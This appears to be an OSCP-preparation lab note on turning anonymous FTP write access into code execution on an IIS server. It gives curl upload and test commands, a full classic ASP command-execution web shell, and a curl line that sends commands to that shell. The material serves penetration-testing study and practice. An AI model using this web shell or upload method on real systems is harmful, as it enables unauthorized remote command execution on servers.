# Windows - Web - FTP Upload

**Step 23G of 50 · Windows**

*Use anonymous FTP write access to place an executable web file in an IIS web root.*

## Run this

> **Why:** This uploads a controlled file to the FTP root so the tester can determine whether the same directory is served and executed by IIS.
```bash
curl --upload-file $BoxDir/www/$File ftp://$BoxIP/$RemoteFile
curl -s -o /dev/null -w "%{http_code}\n" http://$BoxIP/$RemoteFile
```

## Example output

```text
200
```

## What did you get?

- **A harmless file returns 200:** identify the IIS handler from the extension, then upload the minimum command shell required for the target language.
- **An ASP file executes:** use `curl -sG --data-urlencode "cmd=$Command" http://$BoxIP/$RemoteFile` and save the identity returned by `whoami`.
- **The file downloads instead of executing:** check the IIS handler mapping and try the target's other supported server-side extension once.
- **FTP upload is denied:** keep the read-only listing as loot and return to `[[Windows - Web Enum]]` for another foothold.

## IIS ASP command shell

Classic ASP executes VBScript on older IIS installations. `WScript.Shell.Exec` starts `cmd.exe`, while `StdOut.ReadAll()` returns the command output in the HTTP response.

```asp
<%
Dim cmd, oShell, oExec
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Set oShell = Server.CreateObject("WSCRIPT.SHELL")
    Set oExec = oShell.Exec("cmd.exe /c " & cmd)
    Response.Write oExec.StdOut.ReadAll()
End If
%>
```

## Gotcha

> [!warning] 💡
> A successful FTP upload is not proof of code execution. Request the exact remote path over HTTP and record the returned account before moving to privilege triage.

## Seen in

- [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]] -- anonymous FTP write to the IIS root and ASP command shell

## Related stages

- [[Windows - Service Scan]]
- [[Windows - FTP Enumeration]]
- [[Windows - Web Enum]]
- [[Windows - Shell Received]]

## External Resources

- [Microsoft IIS ASP](https://learn.microsoft.com/en-us/iis/application-frameworks/building-and-running-aspnet-applications/classic-asp)
- [HackTricks FTP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp.html)

## Why this matters for OSCP

This page matters because it turns an anonymous file-transfer finding into a controlled IIS execution test with a documented shell identity.
